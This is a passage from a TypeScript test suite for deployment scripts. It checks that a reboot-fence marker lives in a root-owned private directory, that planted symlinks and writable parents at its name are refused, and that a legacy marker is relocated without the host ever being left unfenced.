    // unrelated listener; only the persisted phase differs — and it flips the outcome from
    // "re-stop and re-fence" to "unwind and leave it running". That is exactly what a run
    // interrupted across the stop used to get.
    // PORT (deploy.sh) and APP_PORT (update.sh, install.sh) are the same port under the two
    // names the scripts use; both are set so the listener is visible to whichever is read.
    const listener = [
      'PREDECESSOR_ACTIVE=false',
      'PORT=3000',
      'APP_PORT=3000',
      'ss(){ echo "LISTEN 0 511 0.0.0.0:3000 0.0.0.0:*"; return 0; }',
    ].join('\n')
    const result = runAdoption(entry, completeMarker('phase=arming\nmigration_attempted=true\nschema_touched=false\n'), listener)

    assert.match(result.stdout, /INTERRUPTED ARMING/, `an arming with a live listener resumes:\n${result.stdout}`)
    assert.ok(!/systemctl stop/.test(result.log), 'and stops nothing')
    assert.equal(result.markerExists, false, 'and takes the reversible fence down')
  })
}

// ---------------------------------------------------------------------------
// FINDING 3 — one cutover namespace, and the runbook that says so is now true.
//
// deploy.sh kept its marker, cron backup, connection-fence state and lock under
// /var/lib/ims-deploy while install.sh and update.sh kept theirs under the application data
// directory — and install.sh's failure banner told the operator that deploy.sh "adopts this
// fence". Following that instruction after a failed install ran deploy.sh against a
// namespace holding none of it.
// ---------------------------------------------------------------------------

/**
 * The right-hand side of the one SCRIPT-SCOPE assignment, as the script actually writes it.
 *
 * Resolved through shellConstant() rather than by an anchor on the name (o3d-secops): most of
 * these declarations begin `readonly` now, and a `^NAME=` match would simply have stopped finding
 * them. shellConstant() also refuses a script that assigns the name twice, which the anchor would
 * have taken the first of.
 */
function assignment(source: string, name: string): string {
  const line = shellConstant(source, name)
  const at = line.indexOf(`${name}=`)
  assert.notEqual(at, -1, `the script must define ${name}`)
  return line.slice(at + name.length + 1)
}

test('all three entrypoints resolve the cutover namespace from the same expression', () => {
  const resolved = R9_SCRIPTS.map((entry) => assignment(entry.source, 'CUTOVER_STATE_DIR'))
  assert.equal(
    new Set(resolved).size,
    1,
    `a namespace resolved differently per entrypoint is the defect itself:\n${R9_SCRIPTS.map((e, i) => `${e.name}: ${resolved[i]}`).join('\n')}`,
  )

  // And every path that decides recovery hangs off it, in the same shape everywhere.
  for (const key of ['CRON_BACKUP', 'DB_FENCE_DIR', 'LOCK_FILE'] as const) {
    const values = R9_SCRIPTS.map((entry) => assignment(entry.source, key))
    assert.equal(
      new Set(values).size,
      1,
      `${key} must be the same path in all three:\n${R9_SCRIPTS.map((e, i) => `${e.name}: ${values[i]}`).join('\n')}`,
    )
    // o3d-secops r22, Codex CRITICAL x2: two of these three left ${CUTOVER_STATE_DIR}, and it is
    // the same reason the marker left it in r20 — it is the application's own data directory, so
    // ${APP_USER} owns every name directly beneath it, and both of these were root-side targets.
    // ONE path everywhere is still the requirement; which shared parent it hangs off is the fix.
    const root = key === 'CRON_BACKUP' ? /\$\{CUTOVER_STATE_DIR\}/ : /\$\{CUTOVER_ROOT_DIR\}/
    assert.match(values[0], root, `${key} must derive from a shared namespace, not a private directory`)
  }

  // THE MARKER IS THE ONE THAT LEFT, AND DELIBERATELY (o3d-secops r20, Codex CRITICAL). One path
  // everywhere is still the requirement — a fence one entrypoint writes and another cannot see is
  // the failure the shared namespace exists to end — but ${CUTOVER_STATE_DIR} is the application's
  // own data directory, and `unlink(2)`/`rename(2)` ask for write permission ON THE PARENT and
  // nothing about the file. A root-owned 0600 marker in a directory ${APP_USER} owns is a marker
  // ${APP_USER} can delete, and deleting it lifts the reboot fence. So it is under a root-owned
  // literal, and that it is a LITERAL rather than an override is the point: an override only a
  // root-owned source may set is indistinguishable from no override.
  for (const key of ['FENCE_MARKER_DIR', 'FENCE_FILE', 'LEGACY_STATE_DIR_FENCE_FILE'] as const) {
    const values = R9_SCRIPTS.map((entry) => assignment(entry.source, key))
    assert.equal(
      new Set(values).size,
      1,
      `${key} must be the same path in all three:\n${R9_SCRIPTS.map((e, i) => `${e.name}: ${values[i]}`).join('\n')}`,
    )
  }
  const markerDir = R9_SCRIPTS.map((entry) => assignment(entry.source, 'FENCE_MARKER_DIR'))[0]
  assert.equal(markerDir, '"/etc/ims-cutover"',
    `the marker's directory must be a root-owned literal, not an expression anything else can aim: ${markerDir}`)
  assert.match(assignment(R9_SCRIPTS[0].source, 'FENCE_FILE'), /^"\$\{FENCE_MARKER_DIR\}\//,
    'and the marker must hang off it rather than spelling a second path')
  // AND THE PATH IT LEFT IS STILL NAMED, because an installation fenced before this round has its
  // marker there and a drop-in that asserts on it.
  assert.match(assignment(R9_SCRIPTS[0].source, 'LEGACY_STATE_DIR_FENCE_FILE'), /\$\{CUTOVER_STATE_DIR\}/,
    'the pre-r20 marker path must still be derived from the shared namespace, or an upgrade cannot find it')

  // The connection-fence state is one level down, and also shared.
  const fenceStates = R9_SCRIPTS.map((entry) => assignment(entry.source, 'DB_FENCE_STATE'))
  assert.equal(new Set(fenceStates).size, 1, `DB_FENCE_STATE must be the same path in all three: ${fenceStates.join(' | ')}`)

  // No entrypoint may quietly keep its own.
  for (const entry of R9_SCRIPTS) {
    const privatePaths = entry.source
      .split(/\r?\n/)
      .filter((line) => /^(CRON_BACKUP|DB_FENCE_STATE|DB_FENCE_DIR|LOCK_FILE)=/.test(line))
      .filter((line) => !line.includes('${CUTOVER_STATE_DIR}') && !line.includes('${CUTOVER_ROOT_DIR}') && !line.includes('${DB_FENCE_DIR}'))
    assert.deepEqual(privatePaths, [], `${entry.name} still resolves cutover state outside the shared namespace: ${privatePaths}`)
  }
})


// ---------------------------------------------------------------------------
// THE MARKER'S PARENT (o3d-secops r20, Codex CRITICAL)
//
// ${FENCE_FILE} lived in ${CUTOVER_STATE_DIR} — the application's own data directory, which
// section 8 hands to ${APP_USER} — and was protected by being root-owned and 0600. That protects
// its BYTES. `unlink(2)` and `rename(2)` ask for write permission ON THE PARENT and ask nothing at
// all about the file, so the account the fence exists to stop could remove the marker (which lifts
// the `AssertPathExists=!` on the next boot) or move it aside and leave one of its own at the name
// (which adoption reads as a record of what the interrupted privileged run did).
//
// WHAT THIS HARNESS CAN AND CANNOT SHOW, STATED RATHER THAN GLOSSED. It runs as ONE account, so
// "${APP_USER} cannot, and root can" is not measurable here — that half rests on the same argument
// the staging-directory prune rests on. What IS measured, for real and on a real filesystem: the
// directory the shipped function creates and the modes it ends up with; the kernel's own answer to
// "may this name be removed", which is a question about the parent's write bit and not about the
// file (asserted only when this harness is unprivileged, because root bypasses it); every shape the
// account could leave at the marker's name being REFUSED rather than adopted; and the relocation
// itself, run against real files, leaving the host fenced at every instant.
// ---------------------------------------------------------------------------

/** The uid this harness runs as. `process.getuid` is optional in the platform typings — on a
 *  platform that does not have it these tests cannot run at all, so its absence is a refusal
 *  rather than a value to guess. */
function harnessUid(): number {
  assert.ok(typeof process.getuid === 'function', 'these tests measure ownership and need a uid')
  return process.getuid!()
}

/** THE DESCRIPTOR HELPER THE RELOCATION READS ITS SOURCE THROUGH (o3d-secops r21). Named here for
 *  the reason install.sh's own rigs name ${IMS_CHOWN_TREE_HELPER}: these harnesses run the shipped
 *  functions OUTSIDE the shipped file, so there is no ${BASH_SOURCE} for the default
 *  `${IMS_SCRIPT_LIB_DIR}/pin-source-file.mjs` to resolve from. It is the shipped helper, not a
 *  stand-in; that the entrypoints reach it by that default is asserted from the source below. */
const PIN_SOURCE_HELPER = join(process.cwd(), 'scripts/lib/pin-source-file.mjs')

/** Where the relocated marker lives in these harnesses: a directory of the run's own, named as a
 *  publication trust root exactly as /etc/ims-cutover is in production (it IS
 *  ${DB_ENV_SNAPSHOT_DIR} there, which is why no new root had to be added for it). */
const FENCE_RELOCATION_EXTRA = (dir: string) => `
LEGACY_STATE_DIR_FENCE_FILE="${dir}/DEPLOY-FENCED"
FENCE_MARKER_DIR="${dir}/marker-dir"
FENCE_FILE="\${FENCE_MARKER_DIR}/DEPLOY-FENCED"
DB_ENV_SNAPSHOT_DIR="\${FENCE_MARKER_DIR}"
`

for (const entry of R9_SCRIPTS) {
  test(`${entry.name} creates the fence marker's directory owned by the run and private to it, and refuses a symlink at its name`, () => {
    /**
     * ROUTE: the shipped ensure_fence_marker_dir(), run for real, over a directory that already
     * exists at 0777 — which is what the marker's old home effectively is, since ${DATA_DIR} is
     * handed to ${APP_USER}. What is measured is the mode and owner left behind.
     */
    const made = runR9(entry, ['ensure_fence_marker_dir'], [
      'mkdir -p "${FENCE_MARKER_DIR}"',
      'chmod 0777 "${FENCE_MARKER_DIR}"',
      'ensure_fence_marker_dir; echo "RC=$?"',
      'stat -c "MODE=%a OWNER=%u KIND=%F" "${FENCE_MARKER_DIR}"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(made.stdout, /^RC=0$/m, made.stdout)
    assert.match(made.stdout, /^MODE=700 OWNER=\d+ KIND=directory$/m,
      `the marker's directory must end up private to the account running the cutover:\n${made.stdout}`)
    assert.match(made.stdout, new RegExp(`^MODE=700 OWNER=${harnessUid()} `, 'm'),
      `and owned by it:\n${made.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the same shipped function with its chmod made a no-op,
    // which is what leaving the marker in a directory anybody can write amounts to. The 0777 stays.
    const mutated = runR9(entry, [], [
      shellFunction(entry.source, 'ensure_fence_marker_dir').replace('chmod 700 "${dir}" || return 1', ': "${dir}"'),
      'mkdir -p "${FENCE_MARKER_DIR}"',
      'chmod 0777 "${FENCE_MARKER_DIR}"',
      'ensure_fence_marker_dir; echo "RC=$?"',
      'stat -c "MODE=%a" "${FENCE_MARKER_DIR}"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^MODE=777$/m,
      `without the chmod the marker sits in a directory anybody can unlink it from — that is the finding:\n${mutated.stdout}`)

    // AND A SYMLINK AT THAT NAME IS A REFUSAL, not something to chmod: `mkdir -p` is happy with a
    // link to a directory, and a chmod would then secure whatever it points at.
    const linked = runR9(entry, ['ensure_fence_marker_dir'], [
      'mkdir -p "${CUTOVER_STATE_DIR}/elsewhere"',
      'chmod 0777 "${CUTOVER_STATE_DIR}/elsewhere"',
      'ln -s "${CUTOVER_STATE_DIR}/elsewhere" "${FENCE_MARKER_DIR}"',
      // `set -e` is on, so the status is TAKEN rather than left to abort the rig — which would make
      // the refusal indistinguishable from a harness that fell over.
      'rc=0; ensure_fence_marker_dir || rc=$?; echo "RC=${rc}"',
      'stat -c "TARGET=%a" "${CUTOVER_STATE_DIR}/elsewhere"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(linked.stdout, /^RC=1$/m, `a symlink at the marker's directory must be refused:\n${linked.stdout}`)
    assert.match(linked.stdout, /^TARGET=777$/m,
      `and nothing may be done to what it points at:\n${linked.stdout}`)
  })

  test(`${entry.name} refuses to adopt anything at the marker's name that this run did not publish`, () => {
    /**
     * Every shape the account that owns the old parent could leave at the marker's name, and the
     * one the installer publishes. ROUTE: the shipped fence_marker_is_trustworthy(), run for real
     * against real files, with the refusal it produces printed.
     *
     * The FOURTH case is the finding itself: an impeccable 0600 marker inside a directory that is
     * group- and other-writable — which is exactly the shape ${CUTOVER_STATE_DIR} has, because the
     * installer hands that tree to ${APP_USER}.
     */
    const run = runR9(entry, ['ensure_fence_marker_dir', 'fence_marker_is_trustworthy'], [
      'check() { fence_marker_is_trustworthy && echo "$1=TRUSTED" || echo "$1=REFUSED ${FENCE_MARKER_REFUSAL}"; }',
      'rm -rf "${FENCE_MARKER_DIR}"',
      'check missing',
      'ensure_fence_marker_dir',
      'printf "phase=stopping\\nmarker_complete=1\\n" > "${FENCE_FILE}"',
      'chmod 600 "${FENCE_FILE}"',
      'check published',
      'rm -f "${FENCE_FILE}"; ln -s "${CUTOVER_STATE_DIR}/planted" "${FENCE_FILE}"',
      'printf "phase=none\\n" > "${CUTOVER_STATE_DIR}/planted"',
      'check symlink',
      'rm -f "${FENCE_FILE}"; mkdir "${FENCE_FILE}"',
      'check directory',
      'rmdir "${FENCE_FILE}"',
      'printf "phase=stopping\\n" > "${FENCE_FILE}"; chmod 600 "${FENCE_FILE}"',
      'chmod 0777 "${FENCE_MARKER_DIR}"',
      'check writable_parent',
      'chmod 700 "${FENCE_MARKER_DIR}"',
      'chmod 0666 "${FENCE_FILE}"',
      'check writable_marker',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))

    assert.match(run.stdout, /^published=TRUSTED$/m,
      `the marker the installer publishes must be adoptable, or nothing recovers:\n${run.stdout}`)
    for (const name of ['missing', 'symlink', 'directory', 'writable_parent', 'writable_marker']) {
      assert.match(run.stdout, new RegExp(`^${name}=REFUSED `, 'm'),
        `a ${name} at the marker's name is not a record of what a privileged run did:\n${run.stdout}`)
    }
    assert.match(run.stdout, /^writable_parent=REFUSED .*writable by group or other/m,
      `and the refusal must name the parent, which is the whole finding:\n${run.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the check adoption made before this round — `[[ -f ]]`,
    // which follows a symlink and asks nothing about who wrote what it found. Every one of those
    // shapes is then adopted.
    const mutated = runR9(entry, ['ensure_fence_marker_dir'], [
      'check() { [[ -f "${FENCE_FILE}" ]] && echo "$1=TRUSTED" || echo "$1=REFUSED"; }',
      'ensure_fence_marker_dir',
      'printf "phase=none\\n" > "${CUTOVER_STATE_DIR}/planted"',
      'ln -s "${CUTOVER_STATE_DIR}/planted" "${FENCE_FILE}"',
      'check symlink',
      'rm -f "${FENCE_FILE}"',
      'printf "phase=stopping\\n" > "${FENCE_FILE}"; chmod 600 "${FENCE_FILE}"',
      'chmod 0777 "${FENCE_MARKER_DIR}"',
      'check writable_parent',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^symlink=TRUSTED$/m,
      `the existence check adopts a symlink somebody else planted — that is what it replaced:\n${mutated.stdout}`)
    assert.match(mutated.stdout, /^writable_parent=TRUSTED$/m,
      `and a marker in a directory anybody can rewrite:\n${mutated.stdout}`)
  })

  test(`${entry.name} moves a marker left at the pre-r20 path without ever leaving the host unfenced`, () => {
    /**
     * AN ALREADY-FENCED INSTALL, UPGRADED. The marker is at ${CUTOVER_STATE_DIR}/DEPLOY-FENCED and
     * the installed drop-in names that path. ROUTE: the shipped import_relocated_fence_marker(),
     * run for real through the shipped publisher.
     *
     * The claim is an ORDERING: the new marker exists and the OLD ONE IS STILL THERE when the
     * import returns, because the drop-in on disk still asserts on the old one. Only
     * install_reboot_fence(), after it has written, reloaded and VERIFIED a drop-in naming the new
     * path, clears it.
     *
     * WHAT CHANGED IN r22, AND IT IS THE OTHER HALF OF THIS TEST NOW: the marker at the new path is
     * NOT a copy. Not one byte of the old file is read (see the r22 section at the end of this
     * file for why no reading of it can be trusted), so what is published is composed from this
     * run's own facts at the most conservative fence state there is. The ordering above is
     * unchanged and is still what keeps the host fenced across the republication.
     */
    const moved = runR9(entry, ['fsync_path', 'publish_durable_file', 'ensure_fence_marker_dir', 'import_relocated_fence_marker'], [
      'printf "phase=arming\\nschema_touched=false\\nmarker_complete=1\\nROOT_ONLY_BYTES=1\\n" > "${LEGACY_STATE_DIR_FENCE_FILE}"',
      'import_relocated_fence_marker; echo "RC=$?"',
      '[[ -f "${FENCE_FILE}" ]] && echo NEW_MARKER_PUBLISHED || echo NEW_MARKER_MISSING',
      '[[ -f "${LEGACY_STATE_DIR_FENCE_FILE}" ]] && echo OLD_MARKER_STILL_FENCING || echo OLD_MARKER_GONE',
      'cmp -s "${FENCE_FILE}" "${LEGACY_STATE_DIR_FENCE_FILE}" && echo SAME_BYTES || echo BYTES_DIFFER',
      'grep -q "^ROOT_ONLY_BYTES=1$" "${FENCE_FILE}" && echo SOURCE_BYTES_REPUBLISHED || echo SOURCE_BYTES_NOT_REPUBLISHED',
      'sed -n "s/^\\(phase\\|schema_touched\\|migration_attempted\\|legacy_marker_unauthenticated\\)=/ADOPTED_\\1=/p" "${FENCE_FILE}"',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(moved.stdout, /^RC=0$/m, moved.stdout)
    assert.match(moved.stdout, /^NEW_MARKER_PUBLISHED$/m, `the marker must reach its new home:\n${moved.stdout}`)
    assert.match(moved.stdout, /^BYTES_DIFFER$/m,
      `and it must NOT be a copy of a file in the service account's own directory:\n${moved.stdout}`)
    assert.match(moved.stdout, /^SOURCE_BYTES_NOT_REPUBLISHED$/m,
      `not one byte of the old file may become this host's record of an interrupted deploy:\n${moved.stdout}`)
    // AND THE THREE LINES ADOPTION ACTS ON ARE THE EXPENSIVE READING, not the old file's own. The
    // planted marker said `arming` and `schema_touched=false`, which is the reading that leaves a
    // service running and releases a connection fence; neither survives.
    assert.match(moved.stdout, /^ADOPTED_phase=stopping$/m, `phase must be read the expensive way:\n${moved.stdout}`)
    assert.match(moved.stdout, /^ADOPTED_schema_touched=true$/m, `and so must the schema:\n${moved.stdout}`)
    assert.match(moved.stdout, /^ADOPTED_migration_attempted=true$/m, `and the intent:\n${moved.stdout}`)
    assert.match(moved.stdout, /^ADOPTED_legacy_marker_unauthenticated=1$/m,
      `and the marker must say those three are a policy and not a reading:\n${moved.stdout}`)
    assert.match(moved.stdout, /^OLD_MARKER_STILL_FENCING$/m,
      `and the old one must survive the import, because the drop-in on disk still asserts on it:\n${moved.stdout}`)
    assert.match(moved.stdout, /NONE OF IT HAS BEEN READ/,
      `and the operator must be told what was and was not established:\n${moved.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the same shipped importer with the `rm -f` that
    // import_legacy_file() performs appended to it — the obvious shape, and the dangerous one. The
    // old marker is then gone while the installed drop-in still names it, so a reboot in the
    // interval before the drop-in is re-pointed starts the service over the migrated schema.
    const eager = runR9(entry, ['fsync_path', 'publish_durable_file', 'ensure_fence_marker_dir'], [
      shellFunction(entry.source, 'import_relocated_fence_marker')
        .replace('  return 0\n}', '  rm -f "${LEGACY_STATE_DIR_FENCE_FILE}"\n  return 0\n}'),
      'printf "phase=stopping\\nmarker_complete=1\\n" > "${LEGACY_STATE_DIR_FENCE_FILE}"',
      'import_relocated_fence_marker >/dev/null',
      '[[ -f "${LEGACY_STATE_DIR_FENCE_FILE}" ]] && echo OLD_MARKER_STILL_FENCING || echo OLD_MARKER_GONE',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(eager.stdout, /^OLD_MARKER_GONE$/m,
      `an importer that removes the old marker itself leaves the installed drop-in asserting on a file that is gone — that is the failure this ordering exists to avoid:\n${eager.stdout}`)

    // AND BOTH ARE ALREADY PRESENT WITHOUT A REFUSAL, because that is what a crash between the
    // publication and the re-pointed drop-in leaves, and it is the ordinary retry loop.
    const both = runR9(entry, ['fsync_path', 'publish_durable_file', 'ensure_fence_marker_dir', 'import_relocated_fence_marker'], [
      'ensure_fence_marker_dir',
      'printf "phase=stopping\\ncanonical=1\\n" > "${FENCE_FILE}"',
      'printf "phase=stopping\\nold=1\\n" > "${LEGACY_STATE_DIR_FENCE_FILE}"',
      'import_relocated_fence_marker; echo "RC=$?"',
      'grep -q "^canonical=1$" "${FENCE_FILE}" && echo CANONICAL_KEPT || echo CANONICAL_OVERWRITTEN',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(both.stdout, /^RC=0$/m, `a crash-recovery re-run must not be refused:\n${both.stdout}`)
    assert.match(both.stdout, /^CANONICAL_KEPT$/m, `and the authoritative marker must not be overwritten:\n${both.stdout}`)
    assert.match(both.stdout, /A cutover marker is present at BOTH/, `and it must be said out loud:\n${both.stdout}`)
  })

  test(`${entry.name} clears the pre-r20 marker only after the drop-in naming the new one is verified, and lifts both`, () => {
    // THE ORDERING, ASSERTED IN THE SHIPPED TEXT: the removal is BELOW `REBOOT_FENCE_INSTALLED=true`,
    // which install_reboot_fence() only reaches after publish_durable_dropin(), daemon-reload and
    // verify_reboot_fence() have all succeeded. Above that line there is an interval in which the
    // loaded drop-in still names the old marker.
    const arm = shellFunction(entry.source, 'install_reboot_fence')
    const installed = arm.indexOf('REBOOT_FENCE_INSTALLED=true')
    const cleared = arm.indexOf('rm -f "${LEGACY_STATE_DIR_FENCE_FILE}"')
    const verified = arm.indexOf('verify_reboot_fence')
    assert.ok(installed !== -1 && cleared !== -1 && verified !== -1,
      `install_reboot_fence() must verify the fence and then clear the pre-r20 marker:\n${arm}`)
    assert.ok(verified < installed && installed < cleared,
      `the pre-r20 marker may only be cleared once the new fence is verified:\n${arm}`)

    // AND LIFTING THE FENCE LIFTS BOTH, run for real: a marker left at either path refuses the next
    // boot, and there is then nothing left saying why.
    const lifted = runR9(entry, ['remove_reboot_fence'], [
      'systemctl(){ return 0; }',
      'fence_dropin_file(){ echo "${CUTOVER_STATE_DIR}/dropin.conf"; }',
      'FENCE_DROPIN_DIR="${CUTOVER_STATE_DIR}/dropin.d"',
      'FENCE_DROPIN_FILE="${FENCE_DROPIN_DIR}/zz-deploy-fence.conf"',
      'mkdir -p "${FENCE_DROPIN_DIR}" "${FENCE_MARKER_DIR}"',
      ': > "${FENCE_DROPIN_FILE}"',
      ': > "${FENCE_FILE}"',
      ': > "${LEGACY_STATE_DIR_FENCE_FILE}"',
      'remove_reboot_fence >/dev/null 2>&1 || true',
      '[[ -e "${FENCE_FILE}" ]] && echo NEW_MARKER_REMAINS || echo NEW_MARKER_LIFTED',
      '[[ -e "${LEGACY_STATE_DIR_FENCE_FILE}" ]] && echo OLD_MARKER_REMAINS || echo OLD_MARKER_LIFTED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(lifted.stdout, /^NEW_MARKER_LIFTED$/m, lifted.stdout)
    assert.match(lifted.stdout, /^OLD_MARKER_LIFTED$/m,
      `a marker left at the pre-r20 path refuses the next boot just as well:\n${lifted.stdout}`)
  })

  test(`${entry.name} completes an ordinary install and an ordinary upgrade with the marker in its new home`, () => {
    // AN ORDINARY INSTALL: nothing at either path. The import is a no-op, the writer creates the
    // marker's directory itself, publishes into it, and what it published is adoptable.
    const fresh = runR9(entry, ['fsync_path', 'publish_durable_file', 'ensure_fence_marker_dir', 'import_relocated_fence_marker',
      'fence_marker_is_trustworthy', entry.writer], [
      'import_relocated_fence_marker; echo "IMPORT_RC=$?"',
      '[[ -e "${FENCE_FILE}" ]] && echo MARKER_INVENTED || echo NO_MARKER_YET',
      // A PERMISSIVE UMASK, WHICH IS THE POINT. publish_durable_file() creates whatever components
      // of the destination are missing, so the directory would exist either way — at whatever the
      // ambient umask leaves. `umask 000` is what makes the difference between "the writer creates
      // the marker's home ITSELF, root-owned and 0700" and "something created it, 0777" visible,
      // and 0777 is precisely the shape a marker can be unlinked out of.
      'umask 000',
      `${entry.writer} "cutover started"; echo "WRITE_RC=$?"`,
      'stat -c "MARKERDIR_MODE=%a" "${FENCE_MARKER_DIR}"',
      'fence_marker_is_trustworthy && echo ADOPTABLE || echo "NOT_ADOPTABLE ${FENCE_MARKER_REFUSAL}"',
      'grep -q "^marker_complete=1$" "${FENCE_FILE}" && echo COMPLETE || echo INCOMPLETE',
      '[[ -e "${LEGACY_STATE_DIR_FENCE_FILE}" ]] && echo WROTE_OLD_PATH || echo OLD_PATH_UNUSED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(fresh.stdout, /^IMPORT_RC=0$/m, fresh.stdout)
    assert.match(fresh.stdout, /^NO_MARKER_YET$/m, `a fresh install must not invent a fence:\n${fresh.stdout}`)
    assert.match(fresh.stdout, /^WRITE_RC=0$/m, `and the writer must create its own directory:\n${fresh.stdout}`)
    assert.match(fresh.stdout, /^MARKERDIR_MODE=700$/m,
      `and it must be private to this run whatever the ambient umask is, or the marker can be unlinked out of it:\n${fresh.stdout}`)
    assert.match(fresh.stdout, /^ADOPTABLE$/m, `and publish something the next run may act on:\n${fresh.stdout}`)
    assert.match(fresh.stdout, /^COMPLETE$/m, fresh.stdout)
    assert.match(fresh.stdout, /^OLD_PATH_UNUSED$/m,
      `and nothing may be written to the path inside the application's own data directory:\n${fresh.stdout}`)

    // AN ORDINARY UPGRADE: a marker this round's own code left at the new path. Nothing is imported,
    // nothing is refused, and it is adopted exactly as it was written.
    const upgrade = runR9(entry, ['fsync_path', 'publish_durable_file', 'ensure_fence_marker_dir', 'import_relocated_fence_marker',
      'fence_marker_is_trustworthy'], [
      'ensure_fence_marker_dir',
      'printf "phase=stopping\\nschema_touched=true\\nmarker_complete=1\\n" > "${FENCE_FILE}"',
      'chmod 600 "${FENCE_FILE}"',
      'import_relocated_fence_marker; echo "IMPORT_RC=$?"',
      'fence_marker_is_trustworthy && echo ADOPTABLE || echo "NOT_ADOPTABLE ${FENCE_MARKER_REFUSAL}"',
      'grep -q "^schema_touched=true$" "${FENCE_FILE}" && echo UNCHANGED || echo REWRITTEN',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(upgrade.stdout, /^IMPORT_RC=0$/m, upgrade.stdout)
    assert.match(upgrade.stdout, /^ADOPTABLE$/m, upgrade.stdout)
    assert.match(upgrade.stdout, /^UNCHANGED$/m, `an upgrade may not rewrite the record it is adopting:\n${upgrade.stdout}`)
  })
}

test('all three reboot-fence drop-ins assert on the one marker, so a fence one entrypoint writes is a fence the others see', () => {
  // THE HALF THAT WOULD BE WORSE THAN THE FINDING. ${FENCE_FILE} resolving identically in all three
  // is asserted above; this is the other end of it — what systemd is actually told to look at. A
  // drop-in naming a different path from the marker the same script publishes is a fence that is
  // invisible to the run that has to lift it.
  const asserted = R9_SCRIPTS.map((entry) => {
    const lines = entry.source.split(/\r?\n/).filter((line) => line.startsWith('AssertPathExists='))
    assert.equal(lines.length, 1, `${entry.name} must install exactly one reboot-fence assertion: ${lines.join(' | ')}`)
    return lines[0]
  })
  assert.equal(new Set(asserted).size, 1,
    `the three drop-ins must assert on the same marker:\n${R9_SCRIPTS.map((e, i) => `${e.name}: ${asserted[i]}`).join('\n')}`)
  assert.equal(asserted[0], 'AssertPathExists=!${FENCE_FILE}',
    `and on the constant rather than on a path retyped beside it: ${asserted[0]}`)

  // AND EVERY ONE OF THEM ASKS WHETHER THE MARKER MAY BE BELIEVED BEFORE IT READS ONE (o3d-secops
  // r20). The refusal is exercised for real above; what is asserted here is that adoption actually
  // goes through it, which no run of the function on its own can show. It must come BEFORE the
  // first line of the marker is read, so `marker_phase` is the boundary.
  for (const entry of R9_SCRIPTS) {
    const lines = entry.source.split(/\r?\n/)
    const checked = lines.findIndex((line) => line.includes('fence_marker_is_trustworthy || die'))
    // install.sh keeps its adoption in a function and its phase in a local, so the boundary is the
    // call itself rather than one spelling of the variable it lands in.
    const read = lines.findIndex((line) => /=\"\$\(marker_phase\)\"$/.test(line.trim()))
    assert.ok(checked !== -1, `${entry.name} must refuse a marker it cannot trust before adopting it`)
    assert.ok(read !== -1, `${entry.name} must still read the phase it adopts`)
    assert.ok(checked < read,
      `${entry.name} asks whether the marker may be believed AFTER reading it, which is no check at all`)

    // AND THE RELOCATION IS LOOKED FOR ON EVERY RUN, not only on a host that used the namespace
    // deploy.sh kept before o3d-2sm1.5. import_legacy_cutover_state() returns early when
    // ${LEGACY_CUTOVER_STATE_DIR} is absent, so a call placed after that early return would never
    // fire on the hosts this migration is actually for.
    const body = shellFunction(entry.source, 'import_legacy_cutover_state')
    const relocation = body.indexOf('import_relocated_fence_marker')
    const earlyReturn = body.indexOf('|| return 0')
    assert.ok(relocation !== -1, `${entry.name} must look for a marker at the pre-r20 path:\n${body}`)
    assert.ok(earlyReturn !== -1 && relocation < earlyReturn,
      `${entry.name} looks for it only after an early return that most hosts take:\n${body}`)
  }
})

test('the kernel decides whether a name may be removed by the PARENT, which is the whole of the finding', () => {
  /**
   * NOT A CLAIM ABOUT THE SHIPPED CODE — a claim about `unlink(2)`, measured on a real filesystem,
   * because it is the premise everything above rests on and it was the premise the previous round
   * got wrong ("root-owned so that the service account cannot forge a fence").
   *
   * A file at mode 0400 that its owner cannot write is removed without complaint from a directory
   * that is writable, and is NOT removable from one that is not. The file's mode is not consulted.
   *
   * ONLY WHEN UNPRIVILEGED: root bypasses the permission check entirely, so under root this would
   * assert nothing. The run's uid is printed either way, so a suite that quietly became root does
   * not quietly turn this into a pass.
   */
  const base = createTempDirSync('ims-secops-r20-unlink-')
  const writable = join(base, 'writable')
  const sealed = join(base, 'sealed')
  for (const dir of [writable, sealed]) mkdirSync(dir)
  for (const dir of [writable, sealed]) {
    writeFileSync(join(dir, 'DEPLOY-FENCED'), 'phase=stopping\n')
    chmodSync(join(dir, 'DEPLOY-FENCED'), 0o400)
  }
  chmodSync(sealed, 0o500)
  try {
    const removed = runShell(`rm -f ${JSON.stringify(join(writable, 'DEPLOY-FENCED'))}; echo "RC=$?"`)
    assert.match(removed.output, /^RC=0$/m, `a 0400 file in a writable directory is removed: ${removed.output}`)
    assert.equal(existsSync(join(writable, 'DEPLOY-FENCED')), false,
      'the file mode protects the BYTES and says nothing about the name')

    if (harnessUid() !== 0) {
      const refused = runShell(`rm -f ${JSON.stringify(join(sealed, 'DEPLOY-FENCED'))} 2>&1; echo "RC=$?"`)
      assert.match(refused.output, /^RC=[^0]/m, `and the same file is NOT removable from a sealed directory: ${refused.output}`)
      assert.equal(existsSync(join(sealed, 'DEPLOY-FENCED')), true, 'the parent is what decides')
    }
  } finally {
    chmodSync(sealed, 0o700)
    rmSync(base, { recursive: true, force: true })
  }
})

test('all three entrypoints carry the same durability and namespace primitives, byte for byte', () => {
  // A fix applied to one script and not the others is how both the AND-OR harness defect and
  // this namespace split survived a round. Shared text cannot drift silently.
  for (const name of [
    'fsync_path',
